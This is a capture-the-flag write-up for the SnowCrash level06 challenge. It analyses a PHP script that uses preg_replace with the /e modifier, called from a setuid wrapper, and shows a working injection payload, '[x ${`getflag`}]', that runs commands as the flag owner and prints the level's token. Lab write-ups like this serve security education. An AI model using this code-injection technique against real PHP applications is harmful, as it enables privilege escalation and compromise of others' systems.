# Flag06

```
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$
```
This PHP code snippet consists of two functions and a main script that processes input arguments:

1. Function `y($m)`:
    
    - This function takes a string `$m` as input.
    - It replaces all occurrences of a dot `.` with the string `" x "`.
    - It then replaces all occurrences of the `@` symbol with the string `" y"`.
    - Finally, it returns the modified string.
    
2. Function `x($y, $z)`:
    
    - This function takes two arguments: `$y` and `$z`.
    - It reads the contents of a file specified by the path in `$y` using `file_get_contents()`.
    - It uses a regular expression with the `/e` modifier to perform a search and replace operation on the content of the file.
        
        - The regular expression `"/([x (.*)])/e"` matches patterns like `[x something]`.
        - For each match, it calls the function `y()` with the captured text inside `[x ...]`.  `\2` will refer to the content captured by the second set of parentheses, which in this case is represented by `(.*)`. This allows the script to extract and manipulate specific parts of the matched pattern within the replacement function.
        - The result is then used to replace the matched pattern.
        
    - It further replaces `[` and `]` characters with `(` and `)` respectively.
    - The modified content is returned.
    
3. Main Script:
    
    - The main script initializes a variable `$r` by calling function `x()` with arguments from command line input (`$argv[1]` and `$argv[2]`).
    - It then prints out the result stored in `$r`.

Overall, this code seems to be designed to read a file, process its content using regular expressions and custom functions, and then output the modified content. However, using the [`/e` modifier](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier) in regular expressions for evaluation allows malicious code to be executed and is therefore deprecated in PHP and should be avoided due to security risks.

To test and to better analyze the executable file, I created the folder path `\home\user\level06` in my shell session and copied the `level06.php` file there.

This is the `main()` function of the executable decompiled with Ghidra:
```
undefined4 main(undefined4 param_1,int param_2,char **param_3)

{
  int iVar1;
  char **__envp;
  char *__ptr;
  __gid_t __rgid;
  __uid_t __ruid;
  char *local_34;
  char *local_30;
  char *local_2c;
  char *local_28;
  undefined4 local_24;
  undefined4 *local_18;
  
  __envp = param_3;
  iVar1 = param_2;
  local_18 = &param_1;
  __ptr = strdup("");
  local_28 = strdup("");
  if (*(int *)(iVar1 + 4) != 0) {
    free(__ptr);
    __ptr = strdup(*(char **)(iVar1 + 4));
    if (*(int *)(iVar1 + 8) != 0) {
      free(local_28);
      local_28 = strdup(*(char **)(iVar1 + 8));
    }
  }
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  local_34 = "/usr/bin/php";
  local_30 = "/home/user/level06/level06.php";
  local_24 = 0;
  local_2c = __ptr;
  execve("/usr/bin/php",&local_34,__envp);
  return 0;
}

```
As with the [Flag03](#Flag03) challenge, the goal here is to make the program execute a command since each command is executed with the permissions of the owner, the flag06 user.

Since the text between [backticks](https://unix.stackexchange.com/questions/48392/understanding-backtick) in bash is executed and replaced by the output of the command, something like this made it react:
```
level06@SnowCrash:~$ cat /var/tmp/shell.php
[x ${`getflag`}]
level06@SnowCrash:~$ ./level06 /var/tmp/shell.php
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ su level07
Password:
level07@SnowCrash:~$